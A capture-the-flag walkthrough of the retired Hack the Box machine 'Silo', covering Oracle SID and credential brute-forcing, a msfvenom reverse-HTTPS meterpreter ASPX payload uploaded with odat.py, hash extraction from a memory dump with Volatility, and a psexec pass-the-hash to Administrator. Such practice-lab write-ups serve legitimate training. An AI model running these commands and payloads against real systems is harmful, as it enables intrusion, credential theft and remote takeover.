@@ -1,0 +1,335 @@
+
+								
+																		Hack the Box: Silo Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 6, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Silo” which is available online for those who want to increase their skill in penetration testing and black box testing. Silo is a retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.
+Level: Expert
+Task: find user.txt and root.txt file on the victim’s machine.
+Steps Involved:
+
+Post scanning to discover open ports
+SID brute force
+Credential brute force
+Create payload
+Setup listener
+Upload shell with odat.py
+Getting meterpreter shell
+Finding user.txt
+Downloading zip file from dropbox
+Finding password hashes in memory dump
+Privilege escalation using pass the hash technique
+Finding root.txt
+
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.82 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.82
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.82
+					
+				
+			
+		
+
+Fromthe given below image, you can observe we find only port 80, 135, 139, 445, 1521, 49152-49161 is open on the target system.
+
+As port 80 is running http server we open the target machine’s ip address in our browser, and find that it contains the default IIS page.
+
+We have oracle database listening remotely on port 1521, we need to find the valid SID and credentials in order to connect to the database.
+We first need to get the SID for the oracle service, so we use metasploit to brute force the valid SID.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use auxiliary/admin/oracle/sid_brute
+msf auxiliary(admin/oracle/sid_brute) &gt; set rhost 10.10.10.82
+msf auxiliary(admin/oracle/sid_brute) &gt; run
+			
+				
+					
+				
+					123
+				
+						msf &gt; use auxiliary/admin/oracle/sid_brutemsf auxiliary(admin/oracle/sid_brute) &gt; set rhost 10.10.10.82msf auxiliary(admin/oracle/sid_brute) &gt; run
+					
+				
+			
+		
+
+
+After finding the SID, we brute force the valid credentials using metasploit.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use auxiliary/admin/oracle/oracle_login
+msf auxiliary(admin/oracle/oracle_login) &gt; set sid XE
+msf auxiliary(admin/oracle/oracle_login) &gt; set rhost 10.10.10.82
+msf auxiliary(admin/oracle/oracle_login) &gt; run
+			
+				
+					
+				
+					1234
+				
+						msf &gt; use auxiliary/admin/oracle/oracle_loginmsf auxiliary(admin/oracle/oracle_login) &gt; set sid XEmsf auxiliary(admin/oracle/oracle_login) &gt; set rhost 10.10.10.82msf auxiliary(admin/oracle/oracle_login) &gt; run
+					
+				
+			
+		
+
+ 
+We are unable to get a shell with reverse_tcp, so we use the reverse_https payload. We create a 64-bit payload as the nmap scan shows us that the Operating system is 64-bit windows server.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.14.8 lport=443 -f aspx &gt; /tmp/Shell.aspx
+			
+				
+					
+				
+					1
+				
+						msfvenom -p windows/x64/meterpreter/reverse_https lhost=10.10.14.8 lport=443 -f aspx &gt; /tmp/Shell.aspx
+					
+				
+			
+		
+
+
+We set up our listener before upload the payload to the target machine.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use multi/handler
+msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https
+msf exploit(multi/handler) &gt; set lhost 10.10.14.8
+msf exploit(multi/handler) &gt; set lport 443
+msf exploit(multi/handler) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use multi/handlermsf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_httpsmsf exploit(multi/handler) &gt; set lhost 10.10.14.8msf exploit(multi/handler) &gt; set lport 443msf exploit(multi/handler) &gt; run
+					
+				
+			
+		
+
+ 
+We use this script called odat to further exploit the oracle database(you can download the script here). As we have the valid credentials and the valid SID we use this to login into the database and upload our asp shell in the IIS default directory.
+
+		
+		
+			
+			
+			
+			
+./odat.py dbmsxslprocessor -s 10.10.10.82 -d XE -U scott -P tiger --putFile "C:\inetpub\wwwroot\\" shell.aspx /tmp/Shell.aspx --sysdba
+			
+				
+					
+				
+					1
+				
+						./odat.py dbmsxslprocessor -s 10.10.10.82 -d XE -U scott -P tiger --putFile "C:\inetpub\wwwroot\\" shell.aspx /tmp/Shell.aspx --sysdba
+					
+				
+			
+		
+
+
+As soon as we run the shell on the target machine, we get a reverse shell.
+
+Enumerating through the directories we find two files in “C:\Users\Phineas\Desktop” called “user.txt” and “Oracle issue.txt”. We take a look at the content of user.txt and find our first flag.
+
+We take a look at the content of “Oracle issue.txt” and find a link to a dropbox and a password in which the first char is not being rendered by kali linux.
+
+We find the unrecognized character to be the pound symbol (£). We use the password to login and find a zip file, we download the file into our system.
+
+After downloading the zip file, we unzip it and find that it contains a memory dump. We use volatility tool to investigate the dump.
+
+		
+		
+			
+			
+			
+			
+volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 hivelist
+			
+				
+					
+				
+					1
+				
+						volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 hivelist
+					
+				
+			
+		
+
+
+We now can dump the hashes by supplying the need address which is SYSTEM and SAM.
+
+		
+		
+			
+			
+			
+			
+volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 -y 0xffffc00000028000 -s 0xffffc00000619000
+			
+				
+					
+				
+					1
+				
+						volatility -f SILO-20180105-221806.dmp --profile=Win2012R2x64 -y 0xffffc00000028000 -s 0xffffc00000619000
+					
+				
+			
+		
+
+
+As we have the password hash for “Administrator” we use Pass the Hash technique to get a privileged shell.
+
+		
+		
+			
+			
+			
+			
+msf &gt; use exploit/windows/smb/psexec
+msf exploit(windows/smb/psexec) &gt; set smbuser Administrator
+msf exploit(windows/smb/psexec) &gt; set smbpass &lt;hash&gt;
+msf exploit(windows/smb/psexec) &gt; set rhost 10.10.10.82
+msf exploit(windows/smb/psexec) &gt; run
+			
+				
+					
+				
+					12345
+				
+						msf &gt; use exploit/windows/smb/psexecmsf exploit(windows/smb/psexec) &gt; set smbuser Administratormsf exploit(windows/smb/psexec) &gt; set smbpass &lt;hash&gt;msf exploit(windows/smb/psexec) &gt; set rhost 10.10.10.82msf exploit(windows/smb/psexec) &gt; run
+					
+				
+			
+		
+
+
+After getting a privileged shell, inside “C:\Users\Administrator\Desktop” we find a file called root.txt. We open root.txt and find the final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
